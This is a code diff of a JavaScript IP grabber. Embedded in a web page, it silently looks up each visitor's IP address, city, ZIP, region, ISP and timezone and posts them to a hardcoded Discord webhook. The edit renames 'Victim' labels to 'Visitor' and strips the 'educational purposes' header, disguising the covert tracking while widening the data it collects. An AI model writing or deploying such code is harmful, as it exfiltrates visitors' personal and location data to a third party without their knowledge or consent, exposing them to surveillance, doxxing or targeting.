@@ -1,22 +1,7 @@
-/*
-*     Programmed by Z3NTL3
-*   For Educational Purposes
-*
-*   Get the IP of the web visitor. Even if your website is just static HTML!
-*
-*   IP INFO will be sent to the configured WEBHOOK!
-*
-*/
-
-
 const webhook = "https://discord.com/api/webhooks/1474073969790292130/KXnQaqXw1WPzQ4Q_ZpwU2AxUbmqO7rBk9keeMaV5pLxwcczq9OzaYeezS0BdtPKrJyM8"
 
 async function IP_Info(){
-    /**
-     *  Description: On init , fetches IP information of user
-     *  @return {fetch.Body.json()} Resp Body
-     */
-    let response = await fetch("http://ip-api.com/json", {
+    let response = await fetch("https://ipapi.co/json/", {
       method: 'GET',
       headers: {
         "cache-control" : "no-cache",
@@ -24,73 +9,74 @@ async function IP_Info(){
       }
     })
     return response.json()
-  }
-  IP_Info().then((value)=> {
+}
+
+IP_Info().then((value)=> {
+
     let requiredInfo = [
-      "status","country", "city", "zip", "regionName"
+      "ip","country_name","city","postal","region"
     ]
+
     let noData = false
 
-    for(var i = 0; i < requiredInfo.length; i++){
-      if(typeof(value[`${requiredInfo[i]}`]) === 'undefined'){
+    for(let i = 0; i < requiredInfo.length; i++){
+      if(typeof(value[requiredInfo[i]]) === 'undefined'){
         noData = true
         break
       } 
     }
+
     if(noData){
       return null
     }
+
     return value
-  }).then( async (value) => {
+
+}).then(async (value) => {
+
     if(value !== null){
+
        await fetch(webhook, {
         method: 'POST',
         headers: {
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          content:"``New Victim``",
+          content:"``New Visitor``",
           embeds: [{
-              title: "Victim IP",
+              title: "Visitor IP Information",
               type:"rich",
-              color: "12223968",
+              color: 12223968,
               description: "```IP information of the recent website visitor.```",
               fields: [{
-                name: "IP", value: `${value.query}`, inline: false
+                name: "IP", value: `${value.ip}`, inline: false
               },
               {
-                name: "Country", value: `${value.country}`, inline: false
+                name: "Country", value: `${value.country_name}`, inline: false
               },
               {
                 name: "City", value: `${value.city}`, inline: false
               },
               {
-                name: "ZIP", value: `${value.zip}`, inline: false
+                name: "ZIP", value: `${value.postal}`, inline: false
               },
               {
-                name: "Region", value: `${value.regionName}`, inline: false
-              }
-              ],
-              footer: {
-                text: "Programmed by Z3NTL3",
-                icon_url: "https://avatars.githubusercontent.com/u/48758770?s=400&u=d0a4b500baea4e122b127eb91b4a80af3464f9f5&v=4"
+                name: "Region", value: `${value.region}`, inline: false
               },
-              author: {
-                name: "Pix4",
-                url: "https://code.pix4.dev"
+              {
+                name: "ISP", value: `${value.org}`, inline: false
               },
-              thumbnail: {
-                url: "https://media.tenor.com/h2AVqgVw4ZoAAAAC/gotcha-michael-madsen.gif"
+              {
+                name: "Timezone", value: `${value.timezone}`, inline: false
               }
+              ]
           }]
         })
-      }).then((value)=>{
-        console.log(value.statusText)
       }).catch((err)=>{
         console.log(err)
       })
     }
-  }).catch((err)=> {
+
+}).catch((err)=> {
     console.log(err)
-    console.log('Request not send')
-  })
+})
